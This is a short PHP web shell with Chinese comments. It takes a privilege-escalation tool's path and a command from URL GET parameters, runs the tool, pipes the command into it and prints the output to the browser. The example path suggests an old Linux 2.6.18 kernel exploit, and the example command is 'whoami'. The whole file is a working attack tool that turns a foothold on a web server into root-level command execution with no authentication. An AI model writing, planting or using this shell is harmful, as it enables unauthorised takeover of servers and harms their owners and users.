<?php
// path是提权工具的绝对路径,例如:/usr/local/htdocs/2.6.18
// cmd是你需要执行的命令，例如:whoami
if(isset($_GET['path']) && isset($_GET['cmd'])){
    $path = $_GET['path'];
    $cmd = $_GET['cmd'];
    $descriptorspec = array(
       0 => array("pipe", "r"),
       1 => array("pipe", "w"),
       2 => array("pipe", "w")
    );
    $process = proc_open($path, $descriptorspec, $pipes);
 
    if (is_resource($process)) {
        fwrite($pipes[0],$cmd);
        fclose($pipes[0]);
        echo stream_get_contents($pipes[1]);
        echo stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $return_value = proc_close($process);
    }       
}
?>